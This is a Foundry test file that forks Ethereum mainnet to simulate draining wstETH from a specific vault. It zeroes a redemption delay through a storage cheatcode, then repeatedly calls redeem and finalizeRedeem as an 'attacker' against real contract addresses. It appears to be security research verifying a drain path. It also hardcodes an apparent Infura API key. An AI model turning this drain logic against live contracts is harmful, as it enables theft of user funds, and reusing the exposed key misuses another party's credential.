// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * Verify that delay=0 path actually works for drain
 */
contract VerifyDelayZeroPath is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DetailedDelayZeroExploit() public {
        console.log("=== DETAILED DELAY=0 EXPLOIT ===\n");

        // 1. Show current state
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        console.log("Original slot 4:");
        console.logBytes32(slot4);

        uint32 originalDelay = uint32(uint256(slot4) >> 96);
        console.log("Original delay (seconds):", originalDelay);
        console.log("Original delay (days):", originalDelay / 86400);

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH balance:", vaultBalance / 1e18);

        // 2. Set delay to 0
        console.log("\n--- Setting delay to 0 ---");
        uint256 newSlot4 = uint256(slot4) & ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(newSlot4));

        bytes32 modifiedSlot4 = vm.load(R0, bytes32(uint256(4)));
        uint32 newDelay = uint32(uint256(modifiedSlot4) >> 96);
        console.log("New delay:", newDelay, "seconds");

        // 3. Give attacker TASSET
        deal(TASSET, attacker, 100000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        console.log("\n--- Attacker state before ---");
        console.log("TASSET:", IERC20(TASSET).balanceOf(attacker) / 1e18);
        console.log("wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);

        // 4. Call redeem
        console.log("\n--- Calling redeem ---");
        (bool redeemSuccess, bytes memory redeemData) = R0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(10000e18))
        );
        console.log("Redeem success:", redeemSuccess);
        if (!redeemSuccess && redeemData.length > 0) {
            console.log("Redeem revert:");
            console.logBytes(redeemData);
        }

        // 5. Check redemption was created
        console.log("\n--- Checking redemption ---");
        bytes32 arrayLengthSlot = keccak256(abi.encode(attacker, uint256(5)));
        bytes32 lengthData = vm.load(R0, arrayLengthSlot);
        console.log("Redemption count:", uint256(lengthData));

        if (uint256(lengthData) > 0) {
            bytes32 baseSlot = keccak256(abi.encode(arrayLengthSlot));
            bytes32 redeemSlot0 = vm.load(R0, baseSlot);
            bytes32 redeemSlot1 = vm.load(R0, bytes32(uint256(baseSlot) + 1));

            console.log("Redemption slot 0:");
            console.logBytes32(redeemSlot0);
            console.log("Redemption slot 1:");
            console.logBytes32(redeemSlot1);

            uint96 maturity = uint96(uint256(redeemSlot0));
            uint96 amount = uint96(uint256(redeemSlot0) >> 96);

            console.log("Maturity timestamp:", maturity);
            console.log("Current timestamp:", block.timestamp);
            console.log("Amount:", uint256(amount) / 1e18);
            console.log("Is mature:", block.timestamp >= maturity);
        }

        // 6. Call finalize
        console.log("\n--- Calling finalizeRedeem ---");
        (bool finalizeSuccess, bytes memory finalizeData) = R0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("Finalize success:", finalizeSuccess);
        if (!finalizeSuccess && finalizeData.length > 0) {
            console.log("Finalize revert:");
            console.logBytes(finalizeData);
        }

        vm.stopPrank();

        // 7. Final state
        console.log("\n--- Final state ---");
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
        console.log("VAULT wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
    }

    function test_IterativeFullDrain() public {
        console.log("=== ITERATIVE FULL DRAIN WITH DELAY=0 ===\n");

        // Set delay to 0
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 newSlot4 = uint256(slot4) & ~(uint256(type(uint32).max) << 96);
        vm.store(R0, bytes32(uint256(4)), bytes32(newSlot4));

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH before:", vaultBalanceBefore / 1e18);

        // Give attacker lots of TASSET
        deal(TASSET, attacker, 10000000e18); // 10M TASSET

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        uint256 totalDrained = 0;
        uint256 iterations = 0;
        uint256 maxIter = 10;

        while (iterations < maxIter) {
            uint256 wstethBefore = IERC20(wstETH).balanceOf(attacker);

            // Redeem
            (bool rs,) = R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(100000e18)));
            if (!rs) {
                console.log("Redeem failed at iteration", iterations);
                break;
            }

            // Finalize
            (bool fs,) = R0.call(abi.encodeWithSignature("finalizeRedeem(uint256)", iterations));
            if (!fs) {
                console.log("Finalize failed at iteration", iterations);
                break;
            }

            uint256 wstethAfter = IERC20(wstETH).balanceOf(attacker);
            uint256 gained = wstethAfter - wstethBefore;

            if (gained == 0) {
                console.log("No gain at iteration", iterations);
                break;
            }

            totalDrained += gained;
            console.log("Iteration %d gained: %d wstETH", iterations, gained / 1e18);

            iterations++;
        }

        vm.stopPrank();

        console.log("\n=== RESULTS ===");
        console.log("Total iterations:", iterations);
        console.log("Total drained:", totalDrained / 1e18, "wstETH");

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("VAULT wstETH after:", vaultBalanceAfter / 1e18);
        console.log("VAULT drained:", (vaultBalanceBefore - vaultBalanceAfter) / 1e18, "wstETH");

        // USD value (wstETH ~= $2300)
        uint256 usdValue = (totalDrained / 1e18) * 2300;
        console.log("Estimated USD value: $", usdValue);
    }
}
